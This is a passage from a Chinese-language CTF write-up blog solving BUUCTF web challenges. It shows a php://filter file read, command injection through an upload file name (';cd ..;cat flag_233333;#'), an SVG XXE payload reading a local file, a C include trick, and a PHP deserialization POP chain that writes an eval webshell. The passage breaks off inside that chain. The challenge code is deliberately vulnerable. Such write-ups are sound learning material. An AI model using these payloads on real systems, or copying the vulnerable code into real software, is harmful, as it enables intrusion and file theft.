class="hljs-subst">$pass</span>&#x27;,&#x27;0&#x27;)&quot;</span>;<br>    <span class="hljs-variable">$res</span> = sql_query(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$mysqli</span>-&gt;insert_id;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">logout</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    session_destroy();<br>    Header(<span class="hljs-string">&quot;Location: index.php&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>在function.php中有parse_url解析漏洞,在user.php前面多加一个&#x2F;就能使之返回false</p><p><code>http://49fc2ec2-0dad-4d31-8144-ba9cd5b198af.node4.buuoj.cn:81//user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg</code></p><p>ffffllllaaaaggg.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can find sth in m4aaannngggeee&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>然后看这个 m4aaannngggeee</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (FLAG_SIG != <span class="hljs-number">1</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you can not visit it directly&quot;</span>);<br>&#125;<br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;templates/upload.html&quot;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>来到这个页面</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062137315.png"></p><p>没有上传成功但是报错页面体现了另一个页面 <code> /templates/upllloadddd.php</code></p><p>直接访问没有 还是试试伪协议</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$allowtype</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>);<br><span class="hljs-variable">$size</span> = <span class="hljs-number">10000000</span>;<br><span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br><span class="hljs-keyword">if</span>(is_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(!move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:can not move&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;error:not an upload file！&quot;</span>);<br>&#125;<br><span class="hljs-variable">$newfile</span> = <span class="hljs-variable">$path</span>.<span class="hljs-variable">$filename</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;file upload success&lt;br /&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$filename</span>;<br><span class="hljs-variable">$picdata</span> = system(<span class="hljs-string">&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;</span>.<span class="hljs-variable">$filename</span>.<span class="hljs-string">&quot; | base64 -w 0&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/png;base64,&quot;</span>.<span class="hljs-variable">$picdata</span>.<span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]&gt;<span class="hljs-number">0</span>)&#123;<br>    unlink(<span class="hljs-variable">$newfile</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Upload file error: &quot;</span>);<br>&#125;<br><span class="hljs-variable">$ext</span> = array_pop(explode(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$ext</span>,<span class="hljs-variable">$allowtype</span>))&#123;<br>    unlink(<span class="hljs-variable">$newfile</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>牛逼 这里 在line16这块因为缺失了对filename内容的过滤所以可以拼接执行命令</p><p>访问 <code>http://49fc2ec2-0dad-4d31-8144-ba9cd5b198af.node4.buuoj.cn:81//user.php?page=m4aaannngggeee</code></p><p>传入 <code>;ls;#</code> 成功执行命令</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062154467.png" alt="image-20220206215424387"></p><p>随后其他目录有没有东西 <code>;cd ..;ls;#</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062155159.png" alt="image-20220206215512071"></p><p>最后 <code>;cd ..;cat flag_233333;#</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062156416.png" alt="image-20220206215645336"></p><h2 id="BSidesCF-2019-SVGMagic"><a href="#BSidesCF-2019-SVGMagic" class="headerlink" title="[BSidesCF 2019]SVGMagic"></a>[BSidesCF 2019]SVGMagic</h2><p>这里SVG中的二维矢量图，可以自定义恶意语句</p><p>构造</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">note</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-meta-keyword">file</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;file:///proc/self/cwd/flag.txt&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">height</span>=<span class="hljs-string">&quot;100&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;1000&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">&quot;10&quot;</span> <span class="hljs-attr">y</span>=<span class="hljs-string">&quot;20&quot;</span>&gt;</span><span class="hljs-symbol">&amp;file;</span><span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>直接上传</p><h2 id="FireshellCTF2020-Caas"><a href="#FireshellCTF2020-Caas" class="headerlink" title="[FireshellCTF2020]Caas"></a>[FireshellCTF2020]Caas</h2><p>报错是c语言的</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202202062304486.png" alt="image-20220206230438405"></p><p>tm这里居然可以这样文件包含…</p><p><code>\#include &quot;/flag&quot;</code> 绝了</p><h2 id="极客大挑战-2020-Roamphp1-Welcome"><a href="#极客大挑战-2020-Roamphp1-Welcome" class="headerlink" title="[极客大挑战 2020]Roamphp1-Welcome"></a>[极客大挑战 2020]Roamphp1-Welcome</h2><p>环境开不了但是看wp还挺简单的</p><h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$store</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$expire</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$store</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flysystem&#x27;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;store = <span class="hljs-variable">$store</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;expire = <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$contents</span></span>) </span>&#123;<br>        <span class="hljs-variable">$cachedProperties</span> = array_flip([<br>            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,<br>            <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,<br>        ]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$contents</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span> =&gt; <span class="hljs-variable">$object</span>) &#123;<br>            <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$object</span>)) &#123;<br>                <span class="hljs-variable">$contents</span>[<span class="hljs-variable">$path</span>] = array_intersect_key(<span class="hljs-variable">$object</span>, <span class="hljs-variable">$cachedProperties</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$cleaned</span> = <span class="hljs-keyword">$this</span>-&gt;cleanContents(<span class="hljs-keyword">$this</span>-&gt;cache);<br><br>        <span class="hljs-keyword">return</span> json_encode([<span class="hljs-variable">$cleaned</span>, <span class="hljs-keyword">$this</span>-&gt;complete]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$contents</span> = <span class="hljs-keyword">$this</span>-&gt;getForStorage();<br><br>        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-keyword">$this</span>-&gt;expire);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;autosave) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;save();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span>(<span class="hljs-params"><span class="hljs-variable">$expire</span></span>): <span class="hljs-title">int</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$expire</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (is_numeric(<span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$data</span>;<br>        &#125;<br>        <span class="hljs-variable">$serialize</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$serialize</span>(<span class="hljs-variable">$data</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;writeTimes++;<br><br>        <span class="hljs-keyword">if</span> (is_null(<span class="hljs-variable">$expire</span>)) &#123;<br>            <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];<br>        &#125;<br>        <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;getExpireTime(<span class="hljs-variable">$expire</span>);<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-keyword">$this</span>-&gt;getCacheKey(<span class="hljs-variable">$name</span>);<br><br>        <span class="hljs-variable">$dir</span> = dirname(<span class="hljs-variable">$filename</span>);<br><br>        <span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$dir</span>)) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                mkdir(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-comment">// 创建失败</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;serialize(<span class="hljs-variable">$value</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<br>            <span class="hljs-comment">//数据压缩</span><br>            <span class="hljs-variable">$data</span> = gzcompress(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;<br>        <span class="hljs-variable">$result</span> = file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;src&#x27;</span>]))<br>&#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&quot;uploads/&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$dir</span>))<br>&#123;<br>    mkdir(<span class="hljs-variable">$dir</span>);<br>&#125;<br>unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br></code></pre></td></tr></table></figure><p>先看这些代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    ...<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$contents</span> = <span class="hljs-keyword">$this</span>-&gt;getForStorage();<br><br>        <span class="hljs-keyword">$this</span>-&gt;store-&gt;set(<span class="hljs-keyword">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-keyword">$this</span>-&gt;expire);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;autosave) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;save();<br>        &#125;<br>    &#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;writeTimes++;<br><br>        <span class="hljs-keyword">if</span> (is_null(<span class="hljs-variable">$expire</span>)) &#123;<br>            <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];<br>        &#125;<br><br>        <span class="hljs-variable">$expire</span> = <span class="hljs-keyword">$this</span>-&gt;getExpireTime(<span class="hljs-variable">$expire</span>);<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-keyword">$this</span>-&gt;getCacheKey(<span class="hljs-variable">$name</span>);<br><br>        <span class="hljs-variable">$dir</span> = dirname(<span class="hljs-variable">$filename</span>);<br><br>        <span class="hljs-keyword">if</span> (!is_dir(<span class="hljs-variable">$dir</span>)) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                mkdir(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-comment">// 创建失败</span><br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-keyword">$this</span>-&gt;serialize(<span class="hljs-variable">$value</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; function_exists(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<br>            <span class="hljs-comment">//数据压缩</span><br>            <span class="hljs-variable">$data</span> = gzcompress(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);<br>        &#125;<br>        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . sprintf(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;<br>        <span class="hljs-variable">$result</span> = file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>&#125;<br>&#125;<br>    <br></code></pre></td></tr></table></figure><p>A的析构函数会调用save函数，save函数中有 <code>$this-&gt;store-&gt;set($this-&gt;key, $contents, $this-&gt;expire);</code></p><p>A类没有 set函数或者__get方法，但是B有，所以$this-&gt;store&#x3D;new B();</p><p>然后上面代码line 39，显然考察的是绕过死亡exit()，因此构造的shell要求长度是4的倍数，然后想data的值。data变量对应的A中的content变量。</p><p>content由<code> $contents = $this-&gt;getForStorage();</code> 后面的这个函数得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$contents</span></span>) </span>&#123;   <span class="hljs-comment">//比较返回相同的数组</span><br>       <span class="hljs-variable">$cachedProperties</span> = array_flip([<br>           <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,<br>           <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,<br>       ]);<br><br>       <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$contents</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span> =&gt; <span class="hljs-variable">$object</span>) &#123;<br>           <span class="hljs-keyword">if</span> (is_array(<span class="hljs-variable">$object</span>)) &#123;<br>               <span class="hljs-variable">$contents</span>[<span class="hljs-variable">$path</span>] = array_intersect_key(<span class="hljs-variable">$object</span>, <span class="hljs-variable">$cachedProperties</span>);<br>           &#125;<br>       &#125;<br><br>       <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>   &#125;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;  <span class="hljs-comment">//转json格式</span><br>       <span class="hljs-variable">$cleaned</span> = <span class="hljs-keyword">$this</span>-&gt;cleanContents(<span class="hljs-keyword">$this</span>-&gt;cache);<br><br>       <span class="hljs-keyword">return</span> json_encode([<span class="hljs-variable">$cleaned</span>, <span class="hljs-keyword">$this</span>-&gt;complete]);<br>   &#125;<br></code></pre></td></tr></table></figure><p>下面的函数调用上面的，可以直接让content为一个空数组，然后complete为具体shell的值</p><p>那么</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">$this-&gt;complete = base64_encode(&quot;111&quot;.base64_encode(&#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span 